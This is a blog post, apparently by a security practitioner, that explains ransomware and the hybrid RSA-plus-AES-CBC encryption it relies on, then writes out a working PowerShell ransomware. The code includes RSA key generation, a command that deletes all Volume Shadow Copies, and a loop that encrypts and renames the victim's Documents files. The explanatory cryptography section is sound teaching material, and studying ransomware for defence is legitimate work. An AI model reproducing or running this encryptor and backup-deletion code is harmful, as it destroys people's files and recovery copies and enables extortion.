# Coding a ransomware in a minute
I'm taking a little "side-quest" from my macOS introduction series to talk about ransomware.  
Sometimes I do defensive security work - in this case, I'd like to explain why stopping ransomware is so challenging, as well as show how to create a ransomware in a minute.  
This will also give us a nice opportunity to talk a bit about encryption.

## What is ransomware
Ransomware is a type of malware that has the sole purpose of encrypting files that are important to the target human.  
After encryption, the ransomware "reveals" itself by announcing that files have been encrypted, demanging "ransom" for releasing them.  
Basically, ransomware is just software that holds your *data* hostage.  
While varying in sophistication, the "ransoming" part is the interesting part, which is what I'd like to touch.

## Encryption 101
When we talk about encryption, we basically talk about two classes:
- Symmetric encryption: encryption key and decryption key are the same.
- Asymmetric encryption: encryption key and decryption key are different.

While it sounds minor, this has huge implications. It's not an exaggeration to say that much of our modern society is built on these concepts!  
For example, our bank transactions, online shopping, emails and everything else is (I hope!) protected by a network protocol called SSL\TLS.  
That protocol uses both symmetric and asymmetric encryption to ensure several properties that ensure your privacy is safe.

## Symmetric encryption
Symmetric encryption has been around for hundreds of years (really!). When we talk about symmetric encryption, we generally have two categories:
- Block ciphers: the cryptosystem works on *blocks* of data, e.g. every encrypts every 16 bytes. This means that the plaintext has to be padded (which might be a source of vulnerabilities I might discuss in a future blogpost). In a naive implementation, block ciphers output the same encrypted block for two identical input blocks.
- Stream ciphers: the cryptosystem works on each byte of data. You can think of stream ciphers as a blackbox that gets a key and spits out an infinite stream of pseaudo-random bytes. Those bytes are `XOR`'ed with the plaintext to create the encrypted data. This is also why stream ciphers are different from block ciphers with 1 byte - two identical plaintext bytes produce different encrypted output bytes. Think why that property is critical for the safety of the cryptosystem!

The most commonly used symmetric encryption nowadays is [AES](https://en.wikipedia.org/wiki/Advanced_Encryption_Standard), which in its essence - a Block Cipher.  
I've also seen ransomware use [RC4](https://en.wikipedia.org/wiki/RC4) as well (which is a Stream cipher).  
Because of the property that identical plaintext blocks produce identical encrypted output blocks (and obviously vice-versa), all Block ciphers can use a [Mode of Operation](https://en.wikipedia.org/wiki/Block_cipher_mode_of_operation). The Mode of Operation prevents that from happening by using additional information from each block as input to another block, and a new known initial block of information called an `Initialization Vector (IV)`.  
There are many Modes of Operation; one of the most prevalent one is `CBC`. CBC performs a `XOR` operation between the output of the previous block and the plaintext input of the next block. Here's some ASCII art that shows how that works, for instance, with `AES`:

```
Plaintext:  P1            P2            P3    ...           Pn
            |             |             |                   |
            |             |             |                   |
            |             |             |                   |
IV ------> XOR      |--> XOR      |--> XOR    ...     |--> XOR
            |       |     |       |     |             |     |
            |       |     |       |     |             |     |
           AES      |    AES      |    AES            |    AES
            |-------|     |-------|     |---- ... ----|     |
            |             |             |                   |
            V             V             V                   V
Ciphertext: E1            E2            E3    ...           En
```

Note that:
- `IV` is the `initialization vector` and it's a block size (16 bytes).
- `P1`, `P2`, ... `Pn` are the `plaintext` blocks, where the last block (`Pn`) is padded (we won't talk about padding today).
- `E1`, `E2`, ... `En` are the `ciphertext` blocks.

If we mark `IV` as `E0`, we can make a nice formula: `E[n] = AES-encrypt(P[n] XOR E[n-1])`.  
Note that I said `AES` is a Block Cipher (and it is), but there are Modes of Operation that turn Block Ciphers into Stream Ciphers - those include `CTR (counter)` and `GCM (Galois-Counter Mode)`. We won't discuss those, but know these are possible.

In terms of security, Symmetric ciphers are very fast and very safe, and in fact, are quite resilient even against Quantum Computers. This is not a Quantum Computing blogpost, but I will mention that the best known algorithm to crack generic Symmetric encryption systems is [Grover's algorithm](https://en.wikipedia.org/wiki/Grover%27s_algorithm) which can be used to bruteforce a searchspace of keys in `O(sqrt(N))` time complexity - which sounds amazing, until you realize doubling the key size for Symmetric Ciphers completely solves the problem.

## Asymmetric encryption
Asymmetric encryption is much more modern. Imagine a scneaio where we all just use symmetric encryption - that means that to secure a line (let's say - between you and your bank) you'd have to exchange a *secret* (which is the symmetric key) with your bank by physically meeting them in a secure manner. Obviously that's not scalable.  
That problem was solved by coming up with asymmetric encryption - we have two different keys now:
- A `private key` - known only to the entity that generated the key.
- A `public key` - distributed everywhere.

The two keys have a mathematical relation between them that ensure privacy. We won't talk about how that works, but virtually all asymmetric cryptosystems rely on Number Theory and *assumptions* that there are several problems that are computationally hard *unless* there is knowledge of the `private key`.  
A textbook example is the [RSA cryptosystem](https://en.wikipedia.org/wiki/RSA_(cryptosystem)) that uses `Fermat's Little Theorem` on primes numbers, and relies on the computational difficulty of `prime factorization`.
This is not a math-focused blogpost, but I think it's simple enough to share:
1. We choose two random large primes `p` and `q`. Choosing random primes is not a trivial task, and usually done with the [Miller-Rabin algorithm](https://en.m.wikipedia.org/wiki/Miller%E2%80%93Rabin_primality_test).
2. We set `N=pq` and mark `phi=(p-1)(q-1)`. That `phi` is the value of the [Euler Totient Function](https://en.m.wikipedia.org/wiki/Euler%27s_totient_function) and counts the number of numbers below `n` that are *co-prime* of it.
3. We choose a number `e`. Usually you'll see `e=65537` - there are good reasons for that but they're out of scope for this post.
4. We find a number `d` such that `ed=1 (mod phi)`. We say that `d` is the *modular inverse* of `e` (mod `phi`), and find it using [the Extended Euclidean Algorithm](https://en.m.wikipedia.org/wiki/Extended_Euclidean_algorithm).
5. Now we mark `e, N` as the `public key` and `d, N` as the `private key`.
6. Public key operation: `c = m^e (mod N)`.
7. Private key operation: `m = c^d (mod N)`.

Note that computing `phi` for `N` without knowing its prime factors is computationally difficult, and without `phi` it's practically impossible to get the private key `d`.

One note about Quantum Computation (since I mentioned it earlier on Symmetric Encryption systems) is that some of those assumed computentionally difficult problems are known to be broken with a sufficiently powerful Quantum Computer, including `RSA` (you're welcome to read about [Shor's Algorithm](https://en.wikipedia.org/wiki/Shor%27s_algorithm) if you have the appetite!).

One noteworthy remark is that Asymmetric cryptosystems are tough; they require very long keys to be considered safe, and have noticable performance impacts. Also, some of them actually can't encrypt every message (but practically most messages). This is why many cryptosystems use Asymmetric encryption to exchange a secret, which is then used as a key to Symmetric ciphers.

## How cryptography is connected to Ransomware
Obviously, Ransomware needs to encrypt files. Given all the advantages of Symmetric encryption, we'd want to use that, but using a baked-in key for all files doesn't make sense, because:
1. If someone reverse-engineers our ransomware they could simply extract they key (from disk, from memory etc).
2. We'd want different keys for different target computers - assuming we supply a decryptor, we don't want that decryptor to be used on other computers.
3. Decrypting one file (let's say, by exposing the encryption key) should not affect decryption of other files.

There are other reasons as well, but these are the obvious ones. Therefore, we'll do what we discussed earlier:
1. The attacker generates a `private-public key pair`, e.g. with `RSA`.
2. The attacker keeps their `private key` and create a ransomware instance with the `public key`.
3. One the ransomware instance tries to encrypt a file, it marks generates a random `AES` key and `IV`, encrypts the entire file with that AES key (let's say, with `AES-CBC`).
4. The ransomware adds to the file a magic value that says it was encrypted, followed by the `IV` and `AES key` *encrypted with the RSA public key*.

Why does that make sense?
- Each file is encrypted with a different symmetric key.
- To decrypt, the only practical way would be to get the symmetric key for each file, but that's encrypted by the public key.
- The only practical way to decrypt the encrypted symmetric key is with the private key, which only the attacker has!

When the attacker wants to decrypt, the only thing they need to do is supply the private key, which can be baked into the decryptor. The decryptor then:
1. Traverses the entire filesystem, just like the encryptor did.
2. For each file, checks if it has the magic value that marks it as encrypted (some ransomware uses different filenames instead).
3. To decrypt - simply extract the encrypted `AES` key material and decrypt using the private key. Then, decrypt the entire file with the decrypted `AES` key.

Let's code it!

## Coding the encryptor
While I dislike `PowerShell`, I will use it since it's pre-installed on every modern Windows OS box.  
The first thing we'll have to do is generate an `RSA keypair` - i.e. a `public key` and a `private key`. We will save the public and private keys into `xml` files:

```powershell
$rsa = New-Object System.Security.Cryptography.RSACryptoServiceProvider -ArgumentList 2048
$pubkey = $rsa.ToXmlString($false)
$pubkey | Out-File "public-key.xml"
$rsa.toXmlString($true) | Out-File "private-key.xml"
```

There's nothing sophisticated here - first line creates an `RSA` "instance" with a key size of 2048 bits. This already generates the `keypair`. Then, we simply output the public key and private key to `xml` files.  
Now, let's move to the juicy part - the encryptor.  
The first thing I'd do is deleting all [Volume Shadow Copies](https://learn.microsoft.com/en-us/windows-server/storage/file-server/volume-shadow-copy-service) - that's a common technique for Ransomware, and I'd like to stay true to the purpose:

```powershell
Get-WmiObject Win32_Shadowcopy | ForEach-Object {$_.Delete();}
```

At this point - we can start the encryption part:
```powershell
$public_key_xml = "INSERT RSA PUBLIC KEY XML HERE"
$extensions = ".doc,docx,.pdf"
$ransom_extension = ".pwn"
$base_folder = [Environment]::GetFolderPath("MyDocuments")
$rsa = New-Object -TypeName System.Security.Cryptography.RSACryptoServiceProvider
$rsa.FromXmlString($public_key_xml)
$extensions = $extensions.Split(",") | % {"*" + $_.Trim()}
```

- The `public key` is "baked-in" and saved in the `$public_key_xml` variable.
- The set of file extensions is saved in the `$extensions` variable.
- The new file extention we will be using is is saved in `$ransom_extension`.
- We will look for all files under the `$base_folder`, which is my case is the "Documents" folder, but you can do whatever you like.
- We create a new `RSA` instance (`$rsa`) and import the `public key` into that instance.

Now we can iterate all the files and encrypt each one:
```powershell
foreach ($f in (Get-ChildItem -Force -ErrorAction SilentlyContinue -Recurse -Path $base_folder -Include $extensions).fullname)
{
    $bytes = Get-Content $f -Encoding Byte -ReadCount 0
	
    $aes = [Security.Cryptography.SymmetricAlgorithm]::Create('AesManaged')
    $aes.Mode = [Security.Cryptography.CipherMode]::CBC
    $aes.Padding = "PKCS7"
    
	$aes_key = 1..16|%{[byte](Get-Random -Minimum ([byte]::MinValue) -Maximum ([byte]::MaxValue))}
    $aes_key_material = $aes_key + $aes.IV
    $aes_key_material = $rsa.Encrypt($aes_key_material, $false)

    $aes_encryptor = $aes.CreateEncryptor($aes_key, $aes.IV)
    $stream = New-Object -TypeName IO.MemoryStream
    $enc_stream = New-Object -TypeName Security.Cryptography.CryptoStream -ArgumentList @($stream, $aes_encryptor, [Security.Cryptography.CryptoStreamMode]::Write)
    $enc_stream.Write($bytes, 0, $bytes.Length)
    $enc_stream.FlushFinalBlock()
    $encrypted = $stream.ToArray()
    $encrypted += $aes_key_material
	
    Set-Content -Path $f -Value $encrypted -Encoding Byte -Force
    Rename-Item -Path $f -NewName ($f + $ransom_extension)
    $aes.Clear()
    $stream.SetLength(0)
    $stream.Close()
    $enc_stream.Clear()
    $enc_stream.Close()
}
```

